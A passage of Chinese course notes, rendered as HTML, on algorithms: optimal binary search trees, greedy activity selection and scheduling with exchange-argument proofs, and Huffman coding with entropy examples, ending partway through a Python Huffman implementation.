</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#note-ads-wk7-__codelineno-5-9"></a><span class="w">        </span><span class="n">printOptimalParens</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">);</span>
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#note-ads-wk7-__codelineno-5-10"></a><span class="w">        </span><span class="n">cout</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="s">&quot;)&quot;</span><span class="p">;</span>
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#note-ads-wk7-__codelineno-5-11"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#note-ads-wk7-__codelineno-5-12"></a><span class="p">}</span>
</span></code></pre></div>
<h2 id="note-ads-wk7-_4">最优二叉搜索树<a class="headerlink" href="#note-ads-wk7-_4" title="Permanent link">&para;</a></h2>
<div class="admonition question">
<p class="admonition-title">Question</p>
<p>这一问题给定如下输入：给定一列单词 <span class="arithmatex">\( w_1, w_2, \ldots, w_n \)</span>（它们的顺序已经按字典序排列）和它们出现的固定的概率 <span class="arithmatex">\( p_1, p_2, \ldots, p_n \)</span>。问题是要以一种方法在一棵二叉查找树中安放这些单词使得总的期望查找时间最小。</p>
<p>在一棵二叉查找树中，访问深度 <span class="arithmatex">\( d \)</span> 处的每一个元素所需要的比较次数是 <span class="arithmatex">\( d+1 \)</span>，因此如果 <span class="arithmatex">\( w_i \)</span> 被放在深度 <span class="arithmatex">\( d_i \)</span> 上，那么我们期望将 <span class="arithmatex">\( \sum_{i=1}^{N} p_i (1 + d_i) \)</span> 极小化。</p>
</div>
<p>使用贪心和AVL等算法不一定可行，使用分治法又需要首先知道最优根节点在哪里，所以我们使用动态规划的方法来解决这个问题。</p>
<p>如果我们知道最优根节点<span class="arithmatex">\(w_k\)</span>,那么在整个问题的最优解中，由于事先已经按照字母序排好，左子树必然是<span class="arithmatex">\(w_1 \cdots w_{k-1}\)</span> 的最优解，右子树也必然是<span class="arithmatex">\(w_{k+1} \cdots w_n\)</span> 的最优解，因此我们可以得到递推关系</p>
<div class="arithmatex">\[ 
c_{ij} = \sum_{k=i}^{j} p_k + \min\limits_{i \leqslant k \leqslant j} \{ c_{i,k-1} + c_{k+1,j} \}, \quad i \leqslant j.
\]</div>
<p>其中<span class="arithmatex">\(p_k\)</span>代表权重，<span class="arithmatex">\(c_{ij}\)</span>代表从<span class="arithmatex">\(i\)</span>到<span class="arithmatex">\(j\)</span>的最优成本，<span class="arithmatex">\(c_{i,k-1}\)</span>代表左子树的最优成本，<span class="arithmatex">\(c_{k+1,j}\)</span>代表右子树的最优成本。</p>
<p>前面第一项是因为由于根节点的存在，所有的节点都加深一层，是两个子问题结合的结果，后面的项是左右子树的最优解。</p>
<div align="center">
    <img src="../NOTE/ADS/part1/23.png" width=60%>
</div>

<p>这个算法是<span class="arithmatex">\(O(n^3)\)</span>的，但是可以优化到<span class="arithmatex">\(O(n^2)\)</span></p></section><section class="print-page" id="note-ads-wk8" heading-number="2.2.3.10"><h1 id="note-ads-wk8-greedy-algorithm">Greedy Algorithm<a class="headerlink" href="#note-ads-wk8-greedy-algorithm" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3024 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 56 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 6 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 11 分钟</p>
</div>
<p>贪心算法保证每次选择都是局部最优的，如果局部最优也是全局最优，那么贪心算法就是正确的。</p>
<h2 id="note-ads-wk8-_1">活动选择问题<a class="headerlink" href="#note-ads-wk8-_1" title="Permanent link">&para;</a></h2>
<div class="admonition question">
<p class="admonition-title">问题描述</p>
<p>给定一个活动集合 <span class="arithmatex">\(S = \{a_1, a_2, \ldots, a_n\}\)</span>，其中每个活动 <span class="arithmatex">\(a_i\)</span> 都有一个开始时间 <span class="arithmatex">\(s_i\)</span> 和结束时间 <span class="arithmatex">\(f_i\)</span>，且 <span class="arithmatex">\(0 \leqslant s_i &lt; f_i &lt; \infty\)</span>。如果活动 <span class="arithmatex">\(a_i\)</span> 和 <span class="arithmatex">\(a_j\)</span> 满足 <span class="arithmatex">\(f_i \leqslant s_j\)</span> 或 <span class="arithmatex">\(f_j \leqslant s_i\)</span>，则称活动 <span class="arithmatex">\(a_i\)</span> 和 <span class="arithmatex">\(a_j\)</span> 是兼容的（即二者时间不会重合）。活动选择问题就是要找到一个最大的兼容活动子集。</p>
</div>
<div class="admonition idea">
<p class="admonition-title">动态规划</p>
<p>我们假设输入中是按照 <span class="arithmatex">\(n\)</span> 个活动结束时间从小到大排列的。可以设计出两种动态规划的递推式来解决这个问题：</p>
<ol>
<li>设 <span class="arithmatex">\(S_{ij}\)</span> 表示活动 <span class="arithmatex">\(a_i\)</span> 和 <span class="arithmatex">\(a_j\)</span> 之间的最大兼容活动集合（开始时间在 <span class="arithmatex">\(a_i\)</span> 结束之后，结束时间在 <span class="arithmatex">\(a_j\)</span> 开始之前），其大小记为 <span class="arithmatex">\(c_{ij}\)</span>，那么我们有</li>
</ol>
<div class="arithmatex">\[
c_{ij} = \max \{ c_{ik} + c_{kj} + 1 \mid f_i \leqslant s_k &lt; f_k \leqslant s_j \}
\]</div>
<p>这一解法的思想更接近矩阵乘法顺序问题，我们会选择中间的最优解然后分为左右子问题递归。</p>
<ol>
<li>设 <span class="arithmatex">\(S_i\)</span> 表示活动 <span class="arithmatex">\(a_1, a_2, \ldots, a_i\)</span> 的最大兼容活动集合，其大小记为 <span class="arithmatex">\(c_i\)</span>，那么我们有</li>
</ol>
<div class="arithmatex">\[
    c_i = \max \{ c_{i-1}, c_{k(i)} + 1 \}
\]</div>
<p>其中 <span class="arithmatex">\(k(i)\)</span> 表示在 <span class="arithmatex">\(1 \leqslant k \leqslant i\)</span> 中，<span class="arithmatex">\(f_k \leqslant s_i\)</span> 且<span class="arithmatex">\(c_k\)</span>最大的<span class="arithmatex">\(k\)</span>,即不与<span class="arithmatex">\(a_i\)</span>冲突的最晚结束的活动这一思想更接近背包问题的思路，即我们考虑最后一个是否在解中，分成两种情况考虑。</p>
<div class="admonition property">
<p class="admonition-title">Property</p>
<p>两种动态规划的时间复杂度都是 <span class="arithmatex">\(O(n^3)\)</span>，可以优化为 <span class="arithmatex">\(O(n^2)\)</span>。</p>
</div>
</div>
<div class="admonition idea">
<p class="admonition-title">贪心算法</p>
<p>很多时候使用贪心只需要一次遍历就能找到最优解，这里我们可以使用贪心算法来解决活动选择问题。</p>
<p>我们依次排好序后选择 <strong>不冲突的结束时间最早的事件(或者从后往前看依次选择不冲突的开始时间最晚的事件)</strong> 加到最优解中</p>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p>假设 <span class="arithmatex">\(a_k\)</span> 是 <span class="arithmatex">\(a_1, a_2, \ldots, a_n\)</span> 中结束时间最早的活动，那么 <span class="arithmatex">\(a_k\)</span> 一定是某个最大兼容活动子集的一部分。因为如果 <span class="arithmatex">\(a_k\)</span> 不在最大兼容活动子集中，那么我们可以将 <span class="arithmatex">\(a_k\)</span> 替换为最大兼容活动子集中的某个活动，这样我们就得到了一个更大的兼容活动子集，这与我们的假设矛盾。 </p>
</div>
<div class="admonition property">
<p class="admonition-title">Property</p>
<p>如果活动已经排好序排序，那么贪心算法的时间复杂度是 <span class="arithmatex">\(O(n)\)</span>。</p>
<p>否则需要排序，时间复杂度是 <span class="arithmatex">\(O(n \log n)\)</span>。</p>
</div>
</div>
<div class="admonition extra">
<p class="admonition-title">Extra</p>
<ul>
<li>
<p><strong>加权活动选择问题</strong>：每个活动 <span class="arithmatex">\(a_i\)</span> 都有一个权重 <span class="arithmatex">\(w_i\)</span>，我们要找到一个最大权重的兼容活动子集。</p>
<p>此时动态规划仍然可行，但是贪心算法不可行；</p>
</li>
<li>
<p><strong>区间调度问题</strong>：我们现在的问题不再是最大化兼容集合的大小或者权重，而是所有活动都必须举办，考虑将所有活动分配到最少的教室中，使得每个教室内的活动不冲突。</p>
<p>我们可以用贪心算法解决这个问题:将所有活动按照开始时间排序，设置初始教室数量为 1，然后从前往后遍历。每次选择一个活
  动时，我们都看当前的教室中的活动有没有不冲突的，如果有就直接放进对应的教室，如果全部冲突则新开一个教室</p>
</li>
</ul>
<p><div align="center">
    <img src="../NOTE/ADS/part1/24.png" width=60%/>
</div></p>
<p>(a) 展示了一个例子,我们可以看到最多同一时间有三个活动那同时进行，所以我们需要三个教室，如果需要四个教室，说明至少某一时刻有四个活动同时进行，这是不可能的。</p>
<p>(b) 展示了一个贪心算法的实现，我们可以看到从前往后，我们首先选择a,b,c,发现三个活动同时进行，所以开出三个教室，然后到e，d，发现其可以放进不冲突的c，a教室中，以此类推，最后用三个教室解决问题</p>
</div>
<h2 id="note-ads-wk8-_2">调度问题<a class="headerlink" href="#note-ads-wk8-_2" title="Permanent link">&para;</a></h2>
<div class="admonition question">
<p class="admonition-title">问题描述</p>
<p>假设我们现在有 <span class="arithmatex">\(n\)</span> 个任务，每个任务 <span class="arithmatex">\(i\)</span> 都有一个正的完成需要的时间 <span class="arithmatex">\(li\)</span> 和一个权重 <span class="arithmatex">\(wi\)</span>。假定我们只能按一定顺序依次执行这些任务，不能并行。很显然的，我们有 <span class="arithmatex">\(n!\)</span> 种调度方法，我们记 <span class="arithmatex">\(\sigma\)</span> 为某一种调度，那么在调度 <span class="arithmatex">\(\sigma\)</span> 中，任务 <span class="arithmatex">\(i\)</span> 的完成时间 <span class="arithmatex">\(Ci(\sigma)\)</span>是 <span class="arithmatex">\(\sigma\)</span> 中在 <span class="arithmatex">\(i\)</span> 之前的任务长度之和加上 <span class="arithmatex">\(i\)</span> 本身的长度。换句话说，在一种调度中，一个任务的完成时间
就是这个任务从整个流程开始到它自己被执行完毕总共执行的时间。我们的目标是最小化加权完成时</p>
<div class="arithmatex">\[
     T=\min\sum_{i=1}^{n} w_i \cdot C_i(\sigma)
\]</div>
</div>
<p>我们运用贪心算法来解决这个问题，首先，如果它们权重一样，那么我们每次都选择时间最短的任务。如果时间一样，我们可以将任务按照权重排序，然后依次选择权重最大的。那么现在我们要同时考虑权重最大，时间最短的任务：</p>
<ul>
<li>
<p>计算每个任务的<span class="arithmatex">\(w_i-l_i\)</span>,从大到小降序调度任务(<span class="arithmatex">\(l_i-w_i\)</span>,从小到大)</p>
</li>
<li>
<p><span class="arithmatex">\(\dfrac{w_i}{l_i}\)</span>,从大到小降序调度任务(<span class="arithmatex">\(\dfrac{l_i}{w_i}\)</span>,从小到大)</p>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>有两个任务，<span class="arithmatex">\(l1 = 5, l2 = 2, w1 = 3, w2 = 1\)</span>两种方法会返回不同的结果，而第二种才能返回最优解。</p>
<p>当然这只能说明第一种必然是错误的，对于第二种的正确性仍然需要证明。</p>
</div>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p><strong>调度问题的贪心选择性质</strong> 令 <span class="arithmatex">\(i\)</span> 是当前 <span class="arithmatex">\(w_i / l_i\)</span> 最大的任务，则在当前问题下，必一定存在将 <span class="arithmatex">\(i\)</span> 排在首位的最优调度方式。</p>
<p>我们仍然使用“交换参数法”：假设有一个最优解 <span class="arithmatex">\(C\)</span>，如果它的第一个任务是 <span class="arithmatex">\(i\)</span>，结论成立。如果不是，我们考虑将 <span class="arithmatex">\(i\)</span> 不断与前一个任务交换，直到换到第一个位置的过程。假设现在排在 <span class="arithmatex">\(i\)</span> 前面的一个任务是 <span class="arithmatex">\(j\)</span>，我们知道一定有</p>
<div class="arithmatex">\[
\frac{w_i}{l_i} \geqslant \frac{w_j}{l_j}
\]</div>
<p>又所有数都正，故有 <span class="arithmatex">\(w_i l_j - w_j l_i \geqslant 0\)</span>。不难看出，<span class="arithmatex">\(i\)</span> 和 <span class="arithmatex">\(j\)</span> 交换前后其它的任务加权时间完全没有变化。变化仅在于 <span class="arithmatex">\(i\)</span> 和 <span class="arithmatex">\(j\)</span>。设在 <span class="arithmatex">\(i\)</span> 前面的总时间为 <span class="arithmatex">\(t\)</span>，则交换前 <span class="arithmatex">\(i\)</span> 和 <span class="arithmatex">\(j\)</span> 的加权时间和为</p>
<div class="arithmatex">\[
t_1 = w_j (t + l_i) + w_i (t + l_i + l_j),
\]</div>
<p>交换后为</p>
<div class="arithmatex">\[
t_2 = w_i (t + l_j) + w_j (t + l_i + l_j),
\]</div>
<p>二者作差化简有</p>
<div class="arithmatex">\[
t_1 - t_2 = w_i l_j - w_j l_i \geqslant 0,
\]</div>
<p>故由：往前换，加权时间和一定不会变大，故仍然保证最优解。那么我们就可以不断把 <span class="arithmatex">\(i\)</span> 往前换，直到它在第一个位置，这样就证明了贪心选择性质。</p>
<p><strong>调度问题的最优子结构</strong> 在调度问题 <span class="arithmatex">\(S\)</span> 中，我们用贪心策略选出 <span class="arithmatex">\(w_i / l_i\)</span> 最大的 <span class="arithmatex">\(i\)</span> 对应的任务后，剩下的子问题 <span class="arithmatex">\(S_1\)</span>（即在除去 <span class="arithmatex">\(i\)</span> 的任务中寻找一个最小化加权完成时间之和的解）的最优解 <span class="arithmatex">\(C_1\)</span> 和 <span class="arithmatex">\(i\)</span> 一起一定构成了原问题的一个最优解 <span class="arithmatex">\(C\)</span>。</p>
<p>和贪心选择问题完全一致，非常通过的结论就是用反证法想法：如果 <span class="arithmatex">\(C\)</span> 不是最优解，那么必定有一个最优解 <span class="arithmatex">\(C'\)</span>，它对应的加权完成时间记为 <span class="arithmatex">\(T'&lt; T\)</span>，其中 <span class="arithmatex">\(T\)</span> 是 <span class="arithmatex">\(C\)</span> 对应的加权完成时间之和。</p>
<p>根据贪心选择性质，如果把 <span class="arithmatex">\(C'\)</span> 中的 <span class="arithmatex">\(i\)</span> 不断通过相邻交换换到第一个位置，情况一定不会变差，因此得到解 <span class="arithmatex">\(C''\)</span>，我们将这一过程的最优记为 <span class="arithmatex">\(C''\)</span>。于是 <span class="arithmatex">\(C''\)</span> 在选择了 <span class="arithmatex">\(i\)</span> 之后，剩下的选择实际也是<span class="arithmatex">\(S_1\)</span>的一个解，，由于 <span class="arithmatex">\(T′ &lt; T\)</span>，这表明 <span class="arithmatex">\(C''\)</span> 中对应的 <span class="arithmatex">\(S1\)</span> 的解必定比 <span class="arithmatex">\(C1\)</span> 更好，但我们知道 <span class="arithmatex">\(C1\)</span> 是最优解，因此得到矛盾。所以 <span class="arithmatex">\(C1\)</span> 和 <span class="arithmatex">\(i\)</span> 一起一定构成了原问题的一个最优解 <span class="arithmatex">\(C\)</span>。综上以反证法，我们最终得以验证了问题的最优解可以通过贪心 + 最优子结构的方式得到。</p>
</div>
<div class="admonition extra">
<p class="admonition-title">Extra</p>
<ul>
<li>
<p><strong>最小化最大延时</strong>:设有 <span class="arithmatex">\(n\)</span> 个任务，每个任务 <span class="arithmatex">\(j\)</span> 具有一个完成需要的时间 <span class="arithmatex">\(t_j\)</span>，以及一个截止日期 <span class="arithmatex">\(d_j\)</span>。我们只能依次完成这些任务，不能并行
<div align="center">
    <img src="../NOTE/ADS/part1/25.png" width=60%/>
</div>
三个任务长度分别为 1、2、3，截止日期分别为 2、4、6，按如图方式排序，所有任务都能在截止前完成。</p>
<ul>
<li>
<p>按照用时排序，用时短的先完成；这种做法是错误的，因为用时短的任务有可能截至日期很长</p>
</li>
<li>
<p>按照<span class="arithmatex">\(d_j-t_j\)</span>从小到大排序，这似乎看起来正确，但是实际上也是错误的，例如任务1用时1天，3天后截至，任务2用时10天，11天后截至，这样排序后任务2会在截至日期前完成，但是任务1会在截至日期后完成；</p>
</li>
</ul>
</li>
<li>
<p>实际上上面两种思路出现了矛盾，对于第一种，完成时间短的应该早完成，在第二种思路中，完成时间短的，冗余时间反而大，应该晚完成；这就陷入了一个尴尬的境地，我们不知道<span class="arithmatex">\(t_j\)</span>应该被如何考虑----答案是我们不需要考虑，我们只需要考虑<span class="arithmatex">\(d_j\)</span>即可，我们可以将任务按照截至日期排序，然后依次完成。 </p>
</li>
</ul>
</div>
<h2 id="note-ads-wk8-huffman">Huffman 编码<a class="headerlink" href="#note-ads-wk8-huffman" title="Permanent link">&para;</a></h2>
<blockquote>
<p>离散没学懂的，弥补一下<img alt="😭" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f62d.svg" title=":sob:" /></p>
</blockquote>
<p>哈夫曼编码希望找到一个字母表的期望长度最小（依据字母出现频率）的前缀编码，在之前最优二叉搜索树的讨论中我们似乎有一个类似的目标，但那里我们是希望最小化搜索的期望时间，并没有前缀编码的需求。事实上，哈夫曼编码具有非常强的信息论背景。</p>
<h3 id="note-ads-wk8-_3">信息熵与前缀编码<a class="headerlink" href="#note-ads-wk8-_3" title="Permanent link">&para;</a></h3>
<p>对于一个<a href="https://www.kailqq.cc/NOTE/Probability/second/">离散型随机变量<span class="arithmatex">\(X\)</span></a>，其信息熵定义为</p>
<div class="arithmatex">\[
    H(X) = -\sum_{i=1}^{n} p(x_i) \log_2 p(x_i)
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>在平均意义下，信息熵可以理解为对于一个随机变量 <span class="arithmatex">\(X\)</span>，我们需要多少比特来表示它。</p>
</div>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<ul>
<li>考虑一个服从均匀分布且有 32 种可能取值的随机变量 X。为了确定一个结果，需要一个能容纳 32 个不同值的标识，因此用 5 个比特足矣。而其信息熵为</li>
</ul>
<div class="arithmatex">\[
H(X) = -\sum_{i=1}^{32} \frac{1}{32} \log_2 \frac{1}{32} = 5
\]</div>
<ul>
<li>有 8 匹马参加的一场赛马比赛，它们的获胜概率分别为</li>
</ul>
<div class="arithmatex">\[
    \left\{ \frac{1}{2}, \frac{1}{4}, \frac{1}{8}, \frac{1}{16}, \frac{1}{64}, \frac{1}{64}, \frac{1}{64}, \frac{1}{64} \right\}  
\]</div>
<p>假定我们要把哪匹马会赢的信息告诉给别人，其中一个策略是发送胜出的马的编号，这样对于任何一匹马都需要 3 个比特。但由于概率不是均等的，明智的方法是对概率大的马用更短的编码，对概率小的马用更长的编码。例如使用以下编码：0, 10, 110, 1110, 111100, 111101, 111110, 111111，这样平均每匹马需要 2 个比特，比等长的比特数更短。</p>
</div>
<h3 id="note-ads-wk8-_4">算法描述<a class="headerlink" href="#note-ads-wk8-_4" title="Permanent link">&para;</a></h3>
<p>我们以二叉树的形式来构建编码树，信息都存储在叶子节点上，非叶子节点不存储信息。从根节点到叶子节点的路径上的 0 和 1 分别代表左右子树。</p>
<div align="center">
    <img src="../NOTE/ADS/part1/26.png" width=60%/>
</div>

<p>例如我们要编码一串<span class="arithmatex">\(aaaxuaxz\)</span>像这样的一颗树，a的前缀编码是00，u是01，等等。</p>
<p>如果某个字符在深度为 <span class="arithmatex">\(d\)</span> 的位置，那么它的编码长度为 <span class="arithmatex">\(d\)</span>，其出现的频率为 <span class="arithmatex">\(f\)</span>，那么它的总编码长度为 <span class="arithmatex">\(f \cdot d\)</span>。我们的目标是最小化所有字符的总编码长度。</p>
<div class="arithmatex">\[
    \min \sum_{i=1}^{n} f_i \cdot d_i
\]</div>
<p>如果根据频率来编码，我们可以构建这样一颗树</p>
<div align="center">
    <img src="../NOTE/ADS/part1/27.png" width=60%/>
</div>

<div class="admonition note">
<p class="admonition-title">构造哈夫曼编码树</p>
<p>具体来说，我们可以这样构造哈夫曼编码树</p>
<p>构造哈夫曼编码树的具体步骤：</p>
<ul>
<li>统计频率：</li>
</ul>
<p>给定一组待编码的字符，每个字符都有一个出现频率（或者权重）。首先，需要统计每个字符的频率。</p>
<ul>
<li>创建优先队列（最小堆）：</li>
</ul>
<p>根据字符的频率，将所有字符作为节点，并将它们放入一个优先队列（最小堆）中。堆中的每个元素是一个节点，节点的值为字符的频率。优先队列保证每次能够快速取出频率最小的两个节点。</p>
<ul>
<li>构建哈夫曼树：</li>
</ul>
<p>从最小堆中反复取出两个最小频率的节点，创建一个新的父节点。这个父节点的频率是两个子节点频率之和。新的父节点不代表某个具体的字符，而是作为一个中间节点，连接两个原始节点（即两个字符的频率节点）。将新生成的父节点插回最小堆中。这个过程不断重复，直到堆中只剩下一个节点为止。最终剩下的节点就是哈夫曼树的根节点。</p>
<ul>
<li>生成编码：</li>
</ul>
<p>一旦哈夫曼树构建完成，就可以为每个字符分配编码。通过从树的根节点出发，沿着每一条路径到达叶子节点来确定编码。通常，沿左边的边分配"0"，沿右边的边分配"1"。</p>
<ul>
<li>叶子节点所对应的编码即为哈夫曼编码。</li>
</ul>
<details class="info">
<summary>代码实现</summary>
<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ads-wk8-__codelineno-0-1"></a><span class="kn">import</span> <span class="nn">heapq</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ads-wk8-__codelineno-0-2"></a>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ads-wk8-__codelineno-0-3"></a><span class="k">class</span> <span class="nc">Node</span><span class="p">:</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ads-wk8-__codelineno-0-4"></a> <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="n">freq</span><span class="p">):</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-ads-wk8-__codelineno-0-5"></a>     <span class="bp">self</span><span class="o">.</span><span class="n">char</span> <span class="o">=</span> <span class="n">char</span>  <span class="c1"># 字符</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-ads-wk8-__codelineno-0-6"></a>     <span class="bp">self</span><span class="o">.</span><span class="n">freq</span> <span class="o">=</span> <span class="n">freq</span>  <span class="c1"># 频率</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-ads-wk8-__codelineno-0-7"></a>     <span class="bp">self</span><span class="o">.</span><span class="n">left</span> <span class="o">=</span> <span class="kc">None</span>   <span class="c1"># 左子树</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-ads-wk8-__codelineno-0-8"></a>     <span class="bp">self</span><span class="o">.</span><span class="n">right</span> <span class="o">=</span> <span class="kc">None</span>  <span class="c1"># 右子树</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-ads-wk8-__codelineno-0-9"></a>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-ads-wk8-__codelineno-0-10"></a> <span class="k">def</span> <span class="fm">__lt__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="p">):</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-ads-wk8-__codelineno-0-11"></a>     <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">freq</span> <span class="o">&lt;</span> <span class="n">other</span><span class="o">.</span><span class="n">freq</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-ads-wk8-__codelineno-0-12"></a>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-ads-wk8-__codelineno-0-13"></a><span class="k">def</span> <span class="nf">build_huffman_tree</span><span class="p">(</span><span class="n">freqs</span><span class="p">):</span>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#note-ads-wk8-__codelineno-0-14"></a> <span class="c1"># 创建优先队列（最小堆），每个元素是一个Node对象</span>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#note-ads-wk8-__codelineno-0-15"></a> <span class="n">heap</span> <span class="o">=</span> <span class="p">[</span><span class="n">Node</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">freq</span><span class="p">)</span> <span class="k">for</span> <span class="n">char</span><span class="p">,</span> <span class="n">freq</span> <span class="ow">in</span> <span class="n">freqs</span><span class="o">.</span><span class="n">items</span><span class="p">()]</span>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#note-ads-wk8-__codelineno-0-16"></a> <span class="n">heapq</span><span class="o">.</span><span class="n">heapify</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span>
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#note-ads-wk8-__codelineno-0-17"></a>
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#note-ads-wk8-__codelineno-0-18"></a> <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#note-ads-wk8-__codelineno-0-19"></a>     <span class="c1"># 取出两个频率最小的节点</span>
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#note-ads-wk8-__codelineno-0-20"></a>     <span class="n">left</span> <span class="o">=</span> <span class="n">heapq</span><span class="o">.</span><span class="n">heappop</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span>
</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#note-ads-wk8-__codelineno-0-21"></a>     <span class="n">right</span> <span class="o">=</span> <span class="n">heapq</span><span class="o">.</span><span class="n">heappop</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span>
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#note-ads-wk8-__codelineno-0-22"></a>
</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#note-ads-wk8-__codelineno-0-23"></a>     <span class="c1"># 创建一个新的父节点</span>
</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#note-ads-wk8-__codelineno-0-24"></a>     <span class="n">merged</span> <span class="o">=</span> <span class="n">Node</span><span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">left</span><span class="o">.</span><span class="n">freq</span> <span class="o">+</span> <span class="n">right</span><span class="o">.</span><span class="n">freq</span><span class="p">)</span>
</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#note-ads-wk8-__codelineno-0-25"></a>     <span class="n">merged</span><span class="o">.</span><span class="n">left</span> <span class="o">=</span> <span class="n">left</span>
</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#note-ads-wk8-__codelineno-0-26"></a>     <span class="n">merged</span><span class="o">.</span><span class="n">right</span> <span class="o">=</span> <span class="n">right</span>
</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#note-ads-wk8-__codelineno-0-27"></a>
